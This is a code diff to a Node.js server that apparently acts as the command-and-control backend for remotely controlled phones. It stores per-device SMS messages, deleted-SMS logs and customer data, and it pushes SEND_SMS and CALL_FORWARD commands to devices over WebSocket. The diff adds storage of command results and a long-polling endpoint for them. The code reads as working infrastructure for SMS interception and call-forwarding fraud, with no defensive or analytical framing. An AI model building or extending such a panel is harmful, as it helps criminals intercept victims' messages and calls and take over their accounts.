@@ -41,7 +41,8 @@ const deviceSchema = new mongoose.Schema({
   customerData: mongoose.Schema.Types.Mixed,
   isDeleted: { type: Boolean, default: false },
   smsMessages: Array,
-  deletedSmsLog: { type: Array, default: [] }
+  deletedSmsLog: { type: Array, default: [] },
+  lastCommandResult: { type: mongoose.Schema.Types.Mixed, default: null } // New: Save last result here
 }, { timestamps: true });
 
 const Device = mongoose.model('Device', deviceSchema);
@@ -115,7 +116,6 @@ app.post('/api/command', async (req, res) => {
         let device = await Device.findOne(query).lean();
         if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
         
-        // Immediate check for SIM availability
         if (action === 'SEND_SMS' || action.startsWith('CALL_FORWARD')) {
             const slot = data.simSlot || "1";
             const simVal = slot === "1" ? device.sim1 : device.sim2;
@@ -131,9 +131,25 @@ app.post('/api/command', async (req, res) => {
         
         if (!clients || clients.size === 0) return res.json({ success: false, message: 'Device is OFFLINE' });
         
+        // Reset last result when sending new command
+        await Device.findOneAndUpdate(query, { $set: { lastCommandResult: null } });
+
         clients.forEach(c => { if(c.readyState === WebSocket.OPEN) c.send(JSON.stringify({ command: action, data })); });
         return res.json({ success: true, message: 'Command sent. Waiting for response...' });
     } catch(e) { return res.status(500).json({ success: false }); }
+});
+
+// New Endpoint for Long Polling result check
+app.get('/api/check-result/:deviceId', async (req, res) => {
+    try {
+        const { deviceId } = req.params;
+        const query = mongoose.Types.ObjectId.isValid(deviceId) ? { _id: deviceId } : { deviceId };
+        const device = await Device.findOne(query).lean();
+        if (device && device.lastCommandResult) {
+            return res.json({ success: true, result: device.lastCommandResult });
+        }
+        return res.json({ success: false });
+    } catch (e) { res.status(500).json({ success: false }); }
 });
 
 server.on('upgrade', (req, socket, head) => {
@@ -152,9 +168,10 @@ wss.on('connection', (ws, req) => {
       if (!global.deviceSockets.has(id)) global.deviceSockets.set(id, new Set());
       global.deviceSockets.get(id).add(ws);
       
-      // Handle Command Result (Success/Failed from Device)
       if (data.type === 'COMMAND_RESULT') {
-          io.emit('command-result', { deviceId: id, success: data.success, message: data.message, action: data.command });
+          const result = { success: data.success, message: data.message, action: data.command, timestamp: new Date() };
+          await Device.findOneAndUpdate({ deviceId: id }, { $set: { lastCommandResult: result } });
+          io.emit('command-result', { deviceId: id, ...result });
           return;
       }
 
